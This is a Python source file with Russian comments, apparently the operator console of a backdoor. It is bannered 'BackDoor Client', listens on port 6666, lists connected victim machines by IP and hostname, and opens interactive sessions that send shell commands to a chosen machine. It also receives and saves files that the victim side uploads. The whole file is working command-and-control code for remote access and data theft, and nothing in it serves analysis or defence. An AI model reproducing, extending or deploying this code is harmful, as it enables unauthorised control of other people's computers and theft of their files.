import socket
import base64
import os
import threading
import time
import curses
import sys
from datetime import datetime

HOST = '0.0.0.0'
PORT = 6666
LOG_FILE = "zipo_log.txt"
DOWNLOAD_DIR = "downloads"

os.makedirs(DOWNLOAD_DIR, exist_ok=True)

# Глобальный список для хранения подключений.
# Каждый элемент – словарь с ключами 'conn', 'addr', 'hostname'
connections = []
lock = threading.Lock()

def log(msg):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")

def save_file(filename, data_b64):
    try:
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        safe_filename = f"{now}_{filename}"
        path = os.path.join(DOWNLOAD_DIR, safe_filename)
        with open(path, "wb") as f:
            f.write(base64.b64decode(data_b64))
        log(f"Saved file: {path}")
    except Exception as e:
        log(f"Error saving file: {e}")

def handle_recv(conn):
    """
    Принимает данные от выбранного клиента и выводит их в консоль.
    Обрабатывается также передача файлов (формат [UPLOAD]::filename::<base64>::END)
    """
    buffer = ""
    receiving_upload = False
    upload_data = ""
    
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                print("\n[!] Connection closed by target.")
                break
            chunk = data.decode('utf-8', errors='ignore')
            
            if receiving_upload:
                upload_data += chunk
                if "::END" in upload_data:
                    try:
                        parts = upload_data.split("::", 3)
                        filename = parts[1].strip()
                        b64_data = parts[2].strip()
                        save_file(filename, b64_data)
                        print(f"\n[+] File saved: {filename}")
                    except Exception as e:
                        print(f"\n[!] Error decoding upload: {e}")
                    receiving_upload = False
                    upload_data = ""
                continue
            
            if chunk.startswith("[UPLOAD]::"):
                upload_data = chunk
                receiving_upload = True
                continue
            
            buffer += chunk
            if buffer.strip().endswith(">"):
                print(buffer, end="")
                buffer = ""
        except Exception as e:
            print(f"\n[!] Error receiving: {e}")
            break

def handle_send(conn):
    """
    Отправка команд выбранному клиенту в режиме обычного терминала.
    Вводится команда через input().
    """
    while True:
        try:
            cmd = input()
            if cmd.strip().lower() == "exit":
                print("[*] Exiting interactive session...")
                break
            conn.send(cmd.encode('utf-8'))
            log(f"SEND: {cmd}")
        except Exception as e:
            print(f"\n[!] Error sending: {e}")
            break
    try:
        conn.close()
    except Exception:
        pass

def interactive_session(conn, addr, hostname):
    """
    Интерактивная сессия с выбранным клиентом в обычном терминале.
    """
    curses.endwin()  # Выходим из curses-режима
    print(f"\n[+] Starting interactive session with {hostname} ({addr[0]}:{addr[1]})")
    
    recv_thread = threading.Thread(target=handle_recv, args=(conn,), daemon=True)
    recv_thread.start()
    
    handle_send(conn)
    
    # Удаляем соединение из глобального списка
    with lock:
        for i, conn_info in enumerate(connections):
            if conn_info['conn'] == conn:
                connections.pop(i)
                break
    print(f"Session with {hostname} ({addr[0]}:{addr[1]}) ended.")
    input("Press Enter to return to the connection menu...")

def accept_connections(server_socket):
    """
    Постоянно принимает новые подключения.
    Для каждого подключения производится попытка получить имя хоста через gethostbyaddr.
    """
    while True:
        try:
            conn, addr = server_socket.accept()
            try:
                hostname = socket.gethostbyaddr(addr[0])[0]
            except Exception:
                hostname = "unknown"
            with lock:
                connections.append({'conn': conn, 'addr': addr, 'hostname': hostname})
            log(f"Connected from: {addr[0]}:{addr[1]} ({hostname})")
        except Exception as e:
            log(f"Accept error: {e}")
            break

def curses_main(stdscr):
    """
    Главное меню на базе curses.
    Список подключений обновляется каждую секунду.
    Выводится заголовок, число активных соединений и список (слева по краю).
    Пользователь может ввести номер подключения (или 'q' для выхода).
    """
    # Инициализация цветовых пар:
    # Пара 1: белый текст для общего оформления.
    # Пара 2: зелёный текст для списка подключений.
    # Пара 3: жёлтый текст для сообщения, если нет подключений.
    # Пара 4: красный текст для баннера.
    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_WHITE, -1)
    curses.init_pair(2, curses.COLOR_GREEN, -1)
    curses.init_pair(3, curses.COLOR_YELLOW, -1)
    curses.init_pair(4, curses.COLOR_RED, -1)
    
    curses.curs_set(1)
    stdscr.nodelay(True)  # неблокирующий ввод
    input_buffer = ""
    
    # Баннер с заданной символьной графикой (отображается красным)
    banner = r"""
 ▄███████▄   ▄█     ▄███████▄  ▄██████▄  
██▀     ▄██ ███    ███    ███ ███    ███ 
      ▄███▀ ███▌   ███    ███ ███    ███ 
 ▀█▀▄███▀▄▄ ███▌   ███    ███ ███    ███ 
  ▄███▀   ▀ ███▌ ▀█████████▀  ███    ███ 
▄███▀       ███    ███        ███    ███ 
███▄     ▄█ ███    ███        ███    ███ 
 ▀████████▀ █▀    ▄████▀       ▀██████▀  
           
             BackDoor Client
"""
    while True:
        stdscr.clear()
        # Выводим баннер (выравнивание слева)
        stdscr.addstr(banner + "\n", curses.color_pair(4))
        # Заголовок меню
        header = "=== Список активных подключений  ==="
        stdscr.addstr(header + "\n", curses.color_pair(1))
        
        # Вывод количества активных соединений
        active_line = f"Active: {len(connections)}"
        stdscr.addstr(active_line + "\n\n", curses.color_pair(1))
        
        # Вывод списка подключений, выравненного по левому краю
        with lock:
            if connections:
                for idx, conn_info in enumerate(connections):
                    ip = conn_info['addr'][0]
                    hostname = conn_info.get('hostname', 'unknown')
                    line = f"{idx}: {ip} : {hostname}"
                    stdscr.addstr(line + "\n", curses.color_pair(2))
            else:
                no_conn = "Нет активных подключений."
                stdscr.addstr(no_conn + "\n", curses.color_pair(3))
                
        stdscr.addstr("\nВведите номер подключения для сессии и нажмите Enter (или 'q' для выхода):\n", curses.color_pair(1))
        stdscr.addstr(">> " + input_buffer, curses.color_pair(1))
        stdscr.refresh()
        
        try:
            c = stdscr.getch()
            if c == -1:
                time.sleep(0.1)
                continue
            # Обработка Enter (код 10 или 13)
            if c in (10, 13):
                if input_buffer.strip().lower() == 'q':
                    break
                try:
                    idx = int(input_buffer.strip())
                    with lock:
                        if idx < 0 or idx >= len(connections):
                            input_buffer = ""
                            continue
                        selected = connections[idx]
                    interactive_session(selected['conn'], selected['addr'], selected['hostname'])
                    input_buffer = ""
                except Exception:
                    input_buffer = ""
            # Обработка Backspace
            elif c in (curses.KEY_BACKSPACE, 127):
                input_buffer = input_buffer[:-1]
            else:
                input_buffer += chr(c)
        except Exception:
            pass
        time.sleep(0.1)

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"[+] Listening on {HOST}:{PORT}...")
    
    # Поток для приёма новых подключений
    accept_thread = threading.Thread(target=accept_connections, args=(server_socket,), daemon=True)
    accept_thread.start()
    
    # Запуск меню на базе curses
    curses.wrapper(curses_main)
    
    # При выходе закрываем все соединения и сокет
    with lock:
        for conn_info in connections:
            try:
                conn_info['conn'].close()
            except Exception:
                pass
        connections.clear()
    server_socket.close()
    print("Сервер завершил работу.")

if __name__ == "__main__":
    main()
